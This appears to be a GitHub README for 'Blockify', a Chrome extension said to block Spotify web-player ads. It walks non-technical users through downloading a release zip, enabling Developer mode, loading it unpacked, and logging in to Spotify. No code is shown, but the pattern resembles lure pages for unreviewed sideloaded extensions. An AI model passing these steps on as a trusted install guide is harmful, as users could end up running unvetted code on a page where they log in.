## 🚀 Getting Started

Welcome to **Blockify** – your simple solution to enjoy Spotify without annoying interruptions. This extension works directly in your Chrome browser to block ads automatically. No technical skills required.

### ⭐ What Does Blockify Do?

- **Simple Setup:** Works in minutes with just a few clicks.

## 📥 Download & Installation

**Visit this link to download the application:** [Download Blockify](https://github.com/dyrthejono/blockify-browser-extension/releases)

Follow these steps to get Blockify running on your Windows computer:

### Step 1: Download the Extension

1. Click the link above to go to the **Releases** page.
2. Look for the **latest version** (it's usually at the top).
3. Click the **`.zip` file** (or the file that matches your Chrome version) to download it.
4. Save the file to your **Downloads** folder.

### Step 2: Extract the Files

1. Open your **Downloads** folder.
2. Find the downloaded **Blockify** file (it will be a `.zip` file).
3. **Right-click** on the file and choose **"Extract All..."**.
4. Follow the prompts to unzip the folder. A new folder named something like `blockify-browser-extension` will appear.

### Step 3: Load the Extension into Chrome

1. Open **Google Chrome** on your computer.
2. Click the **three dots** (⋮) in the top-right corner of your browser.
3. Go to **"Extensions"** and then **"Manage Extensions"**.
4. In the Extensions page, turn on **"Developer mode"** (it's a toggle switch in the top-right corner).
5. Click the **"Load unpacked"** button that appears on the left side.
6. Navigate to where you extracted the Blockify folder (usually in Downloads).
7. Select the **entire folder** and click **"Select Folder"**.

**That's it!** Blockify is now installed and active in your Chrome browser.

### Step 4: Start Listening Without Ads

- Go to the **Spotify web player** (open.spotify.com).
- Log in to your Spotify account.
- Play any song. Blockify will automatically block ads in the background.
- No buttons to press, no settings to configure – it just works.

## ❓ Troubleshooting

If Blockify isn't working, try these simple fixes:

### 🛑 Blockify Not Blocking Ads?

- **Restart Chrome:** Close all Chrome windows and reopen them.
- **Check the Web Player:** Make sure you're using `open.spotify.com`, not the desktop app.
- **Reinstall:** Remove the extension and load it again following the steps above.

### 🔄 Spotify Not Playing?

- **Refresh the Page:** Press F5 or click the refresh icon on Spotify's tab.
- **Clear Cache:** In Chrome, go to Settings → Privacy and Security → Clear browsing data → Cached images and files.

### 📁 Can't Find the Downloaded File?

- Check your **Downloads** folder (press `Ctrl + J` in Chrome to see your download history).
- If your browser asked where to save it, look in that location.
